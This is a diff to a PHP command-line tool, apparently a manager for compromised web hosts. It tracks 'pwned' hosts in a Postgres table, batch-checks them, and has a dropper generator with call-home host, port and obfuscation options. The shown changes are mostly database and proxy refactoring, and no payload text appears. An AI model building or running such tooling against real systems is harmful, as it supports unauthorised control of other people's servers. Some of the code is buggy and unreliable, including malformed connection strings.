@@ -8,10 +8,10 @@ require "includes/db/postgres_checker.php";
 require "includes/droppers/dynamic_generator.php";
 $cof = array(
     "useragent"=> "sp1.1",
-    "proxy"=> "127.0.0.1:8090",
+    "proxy"=> "",
     "host"=>"127.0.0.1",
     "port"=>"5432",
-    "username"=>"postgres",
+    "username"=>"notroot",
     "password"=>"",
     "dbname"=>"sloppy_bots"
 );
@@ -22,12 +22,16 @@ is_file("sloppy_config.ini") ? define("config", parse_ini_file('sloppy_config.in
 
 try{
     define("CHH", curl_init());
-    curl_setopt(CHH, CURLOPT_USERAGENT,       config['useragent']);
-    curl_setopt(CHH, CURLOPT_PROXY,           config["proxy"]);
+    if (is_null(config['proxy'])) {
+        echo "Not setting proxy information";
+        curl_setopt(CHH, CURLOPT_USERAGENT, config['useragent']);
+    }else{
+        curl_setopt(CHH, CURLOPT_USERAGENT, config['useragent']);
+        curl_setopt(CHH, CURLOPT_PROXY, config["proxy"]);
+    }
 }catch (Exception $e){
     print("{$e}\n\n");
 }
-define('ppg', pg_connect("host=" . config['host'] . " port=" . config['port'] . " user=" . config['username'] . " password=" . config['password'] . "dbname=".config['dbname']));
 
 function logo($last, $cl, bool $error, $error_value){
     if ($last === "q"){
@@ -102,17 +106,18 @@ _MENU;
 }
 
 function opts(){
+    $ppg = pg_connect("host=" . config['host'] . " port=" . config['port'] . " user=" . config['username'] . " password=" . config['password'] . "dbname=".config['dbname']);
     print("\n\nCurrent options enabled:\n\n");
     foreach (config as $temp=>$values){
         print($temp." => ".$values."\n");
     }
     print("\n\n".str_repeat("-", 35) . "\n");
     print("\n\nCurrent DB Status:\n\n");
-    if (ppg == PGSQL_CONNECTION_OK or ppg == PGSQL_CONNECTION_AUTH_OK){
+    if ($ppg == PGSQL_CONNECTION_OK or $ppg == PGSQL_CONNECTION_AUTH_OK){
         print("\nConnected!");
-        print("\nPG Host: ". pg_host(ppg));
-        print("\nPG Port: ". pg_port(ppg));
-        print("\nPG Ping? ". pg_ping(ppg));
+        print("\nPG Host: ". pg_host($ppg));
+        print("\nPG Port: ". pg_port($ppg));
+        print("\nPG Ping? ". pg_ping($ppg));
     }else{
         print("Could not connect... ensure the DB is running and we are allowed to connect to it.");
     }
@@ -316,11 +321,12 @@ function createDropper($callHome, $callhomePort, $duration, $obfsucate, $depth)
     }
 }
 
-function aHo($host)
+function aHo($host, $os, $checkIn)
 {
     $t = new postgres_checker();
     if (!empty($host)){
-        if ($t->insertHost($host) != 0){
+        $path = parse_url($host);
+        if ($t->insertHost($path['scheme']."://".$path['host'].":".$path['port'], $path['path'], $os, $checkIn) != 0){
             echo "Successfully added: $host";
         }else{
             echo "There was an error. Double checking the database.";
@@ -342,11 +348,12 @@ function aHo($host)
 
 function check($host, $path, $batch)
 {
+    $dbC = pg_connect("host=" . config['host'] . " port=" . config['port'] . " user=" . config['username'] . " dbname=" . config['dbname']);
     if (!empty($batch)){
         switch ($batch){
             case "y":
-                $c = pg_exec(DBCONN, "SELECT rhost,uri FROM public.postgres.sloppy_bots WHERE NOT NULL OR NOT '-'");
-                $count = pg_exec(DBCONN, 'SELECT COUNT(*) FROM (SELECT rhost from public.postgres.sloppy_bots WHERE rhost IS NOT NULL) AS TEMP');
+                $c = pg_exec($dbC, "SELECT rhost,uri FROM sloppy_bots_main WHERE NOT NULL OR NOT '-'");
+                $count = pg_exec($dbC, 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
                 echo "Pulling: ". pg_fetch_row($count)."\nThis could take awhile.";
                 curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
                 curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
@@ -411,15 +418,15 @@ function queryDB($host, $fetchWhat)
     # so Example would be a windows based host, it will preset windows options for you when you execute rev, or you can set your own.
     # work in progress.
     # @todo
-    if (!empty($host) | $host != 0){
+    if (!empty($host) || $host != 0){
         try {
-            $dbC = pg_connect("host=" . config['host'] . " port=" . config['port'] . " user=" . config['username'] . " password=" . config['password']);
+            $dbC = pg_connect("host=" . config['host'] . " port=" . config['port'] . " user=" . config['username'] . " password=" . config['password'] . " dbname=" . config['dbname']);
             switch(strtolower($fetchWhat)){
                 case "r":
-                    $row = pg_fetch_row($dbC, sprintf("SELECT os_flavor FROM public.postgres.sloppy_bots WHERE rhost = '%s'", pg_escape_string($host)));
+                    $row = pg_fetch_row($dbC, sprintf("SELECT os_flavor FROM sloppy_bots_main WHERE rhost = '%s'", pg_escape_string($host)));
                     break;
                 default:
-                    $row = pg_fetch_row($dbC, sprintf("SELECT uri FROM public.postgres.sloppy_bots WHERE rhost = '%s'", pg_escape_string($host)));
+                    $row = pg_fetch_row($dbC, sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE rhost = '%s'", pg_escape_string($host)));
                     break;
             }
             if (!empty($row)){
@@ -444,6 +451,7 @@ function queryDB($host, $fetchWhat)
         );
         logo('query DB', clears, true, $errors);
     }
+    return 0;
 }
 
 
@@ -539,7 +547,8 @@ while ($run) {
             system(clears);
             try{
                 $h = readline("Who did we pwn my friend?\n->");
-                aHo($h);
+                $o = readline("Do you know the OS?\n->");
+                aHo($h, $o, 0);
             }catch (Exception $e){
                 logo("a", clears, true, $e);
             }
@@ -556,7 +565,7 @@ while ($run) {
                         break;
                     case "y":
                         echo "Executing batch job!\n";
-                        check($h, queryDB($h, "ch"), "y");
+                        check($h, 'b', "y");
                         break;
                     default:
                         logo('ch',clears,true ,"Your host was empty, sorry but I will return you to the previous menu.\n");
